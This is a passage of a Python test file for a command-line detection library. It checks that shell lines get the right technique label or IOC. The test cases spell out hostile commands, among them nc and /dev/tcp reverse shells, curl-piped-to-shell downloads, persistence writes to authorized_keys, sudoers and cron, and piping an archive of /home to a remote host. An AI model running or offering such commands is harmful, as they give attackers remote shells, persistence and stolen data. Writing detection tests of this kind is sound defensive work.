    ("cat > notes.txt <<'EOF'\nstep 2; " + CRONTAB + " -e\nEOF", None),
    ("cat > n.txt <<'EOF'\nthen; " + PWSH + " -enc SQBFAFgA\nEOF", None),
    ('echo "first\nx | ' + B64 + ' -d\nlast"', None),
    ("pwd\ntrue; whoami", None),
    ("pwd\necho k | " + TEE + " -a ~/.ssh/authorized_keys", None),
    ("pwd\necho x | " + TEE + " -a ~/.bashrc", None),
    ("pwd\necho x | " + TEE + " -a /etc/rc.local", None),
    ("pwd\necho x | " + TEE + " /etc/systemd/system/x.service", None),
    ("pwd\necho x | sudo " + TEE + " /etc/sudoers.d/x", None),
    # The same commands on the first line.
    ("echo aGVsbG8= | " + B64 + " -d", "base64-decode"),
    ("true; " + CRONTAB + " -e", "cron"),
    ("true; " + PWSH + " -enc SQBFAFgA", "powershell-encoded"),
    ("echo k | " + TEE + " -a ~/.ssh/authorized_keys", "ssh-authorized-keys"),
    ("echo x | sudo " + TEE + " /etc/sudoers.d/x", "sudoers-write"),
    # A downloader in the text keeps the persistence -download rules, and a shell running a download, on any line.
    ("pwd\n" + CURL + " -s " + URL_ + "/k | " + TEE + " -a ~/.ssh/authorized_keys", "ssh-authorized-keys-download"),
    ("pwd\n" + CURL + " -s " + URL_ + "/c | " + CRONTAB + " -", "cron-download"),
    ("pwd\n" + BASH + " <(" + CURL + " -s " + URL_ + "/x.sh)", "download-pipe-shell"),
    # Those any-line starts stop at a line that opens a heredoc: what follows is the heredoc's body (a script being
    # written, not run), and nothing after it is read. The heredoc's own command line still counts.
    ("cat > x.sh <<EOF\n" + BASH + " <(" + CURL + " -s " + URL_ + "/x.sh)\nEOF", None),
    ("cat > x.sh <<EOF\nhi\nEOF\n" + BASH + " <(" + CURL + " -s " + URL_ + "/x.sh)", None),
    ("cat > x.sh <<EOF\n(" + CRONTAB + " -l; echo '* * * * * " + CURL + " -s " + URL_ + "/c | " + SH + "') | " + CRONTAB
     + " -\nEOF", "download-pipe-shell"),  # not cron-download; the unanchored curl | sh still reads the body
    (CRONTAB + " - <<EOF\n* * * * * " + CURL + " -s " + URL_ + "/c | " + SH + "\nEOF", "cron-download"),
    # A here-string (<<<) has no body lines, so the lines after it are still read.
    ("grep -c x <<< \"$s\"\n(" + CRONTAB + " -l; echo '* * * * * " + CURL + " -s " + URL_ + "/c | " + SH + "') | "
     + CRONTAB + " -", "cron-download"),
    ("cat<<<x\n" + BASH + " <(" + CURL + " -s " + URL_ + "/x.sh)", "download-pipe-shell"),
])
def test_multi_line_texts(library, text, rule_id):
    rule = library.match(normalize_text(text))
    assert (rule.id if rule else None) == rule_id


# A rule-wide (?i) must not turn sudo -H or -P into options that take an argument.
@pytest.mark.parametrize("line, rule_id", [
    ("sudo -H whoami", "whoami-id"),
    ("sudo -P id", "whoami-id"),
    ("sudo -iH whoami", "whoami-id"),
    ("sudo -H -u root whoami", "whoami-id"),
    ("sudo -H netstat -antp", "network-connections"),
    ("sudo -H ./xmrig", "cryptominer"),
    ("sudo -H rm -rf /tmp/.x", "file-deletion"),
    ("sudo -h host whoami", "whoami-id"),
    ("sudo -p pw: whoami", "whoami-id"),
    ("sudo -u john " + BASH, "sudo-shell"),
])
def test_wrapper_option_letters_keep_their_case(library, line, rule_id):
    rule = library.match(line)
    assert (rule.id if rule else None) == rule_id


# R7 to R12.
@pytest.mark.parametrize("line, rule_id", [
    # The first plain word after the ssh destination starts the remote command.
    ("ssh root@10.0.0[.]5 chown -R www-data /var/www", "ssh-remote"),
    ("ssh host cp -R /etc /tmp/etc", "ssh-remote"),
    ("ssh -i k -R 2222:localhost:22 u@203.0.113[.]5", "tunnel"),
    ("ssh u@203.0.113[.]5 -R 2222:localhost:22", "tunnel"),
    ("ssh -p 22 u@203.0.113[.]5 -L 8080:10.0.0[.]5:80", "tunnel"),
    ("ssh u@203.0.113[.]5 ls -D", "ssh-remote"),
    # A download stops at a pipe, and a probe that saves nothing is not a download.
    (CURL + " -s " + URL + " | grep -o 'x'", None),
    (CURL + " -s -o /dev/null " + URL, None),
    (CURL + " -so /dev/null -w '%{http_code}' " + URL, None),
    (CURL + " --output /dev/null " + URL, None),
    (WGET + " -q -O /dev/null " + URL, None),
    (CURL + " -s -o /tmp/a " + URL, "download-file"),
    # A command piped into nc only sends its output; a fifo loop or nc -e is a shell. The archive it sends is
    # collection, not a shell.
    ("tar czf - /home | " + NC + " 203.0.113[.]5 4444", "archive-collect"),
    (BASH + " -i 2>&1 | " + NC + " 203.0.113[.]5 4444", None),
    ("cat /tmp/f|/bin/" + SH + " -i 2>&1|" + NC + " 203.0.113[.]5 4444 >/tmp/f", "reverse-shell"),
    ("exec 5<>" + DEV_TCP, "reverse-shell"),
    (NC + ".exe -e cmd.exe 203.0.113[.]5 4444", "windows-reverse-shell"),
    (NC.upper() + " -e CMD.EXE 203.0.113[.]5 4444", "windows-reverse-shell"),
    # Editors on persistence targets.
    ("vi /etc/crontab", "cron"),
    ("ed /var/spool/cron/crontabs/root", "cron"),
    ("nano ~/.bashrc", "shell-rc"),
    ("vim /etc/rc.local", "rc-script"),
    ("nano /etc/systemd/system/x.service", "systemd-service"),
    ("sed -i 's/a/b/' /etc/sudoers", "sudoers-write"),
    ("sudo visudo", "sudoers-write"),
    ("emacs ~/.ssh/authorized_keys", "ssh-authorized-keys"),
    ("sed -n '1p' /etc/crontab", None),
    ("vi notes.txt", None),
    # A recursive dir is a file search.
    ("dir /s /b C:\\Users\\*.kdbx", "file-discovery"),
    ("DIR /S *.config", "file-discovery"),
    ("dir", "navigation"),
    # Read-only modes are not edits.
    ("vim -R /etc/crontab", None),
    ("view /etc/crontab", None),
    ("nano -v ~/.bashrc", None),
    ("sudo visudo -c", None),
    ("sudo visudo -cq", None),
    ("vim -Rn /etc/crontab", None),
    ("vim /etc/crontab", "cron"),
])
def test_more_command_lines(library, line, rule_id):
    rule = library.match(line)
    assert (rule.id if rule else None) == rule_id


def test_a_windows_nc_by_path_yields_its_port(library):
    line = "C:\\Users\\Public\\" + NC + ".exe -e cmd.exe 203.0.113[.]5 4444"
    gloss = gloss_for(library, library.match(line), line, AT)
    assert gloss.rule_id == "windows-reverse-shell"
    assert ("port", "4444") in [(i.type, i.value) for i in gloss.iocs]


def test_command_paths_are_not_gloss_iocs(library):
    line = "/usr/bin/" + WGET + " " + URL
    assert [(i.type, i.value) for i in gloss_for(library, library.match(line), line, AT).iocs] == [
        ("url", URL), ("ipv4", "203.0.113[.]5")]
    line = "sudo /bin/rm -rf /tmp/.x"
    assert [i.value for i in gloss_for(library, library.match(line), line, AT).iocs] == ["/tmp/.x"]
